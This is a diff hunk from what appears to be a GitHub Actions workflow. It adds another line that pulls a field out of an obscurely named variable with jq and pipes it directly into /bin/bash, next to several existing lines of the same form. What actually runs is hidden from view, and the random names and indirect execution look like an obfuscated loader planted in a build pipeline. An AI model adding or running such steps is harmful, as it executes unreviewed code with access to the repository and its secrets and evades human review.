@@ -34,6 +34,7 @@ jobs:
           printf '%s' "$ttp0300" | jq -r .g693 | /bin/bash
           echo $f061 | jq -r .mjyd14 | /bin/bash
           echo $i61 | jq -r .i9183 | /bin/bash
+          echo $b31 | jq -r .rg747 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
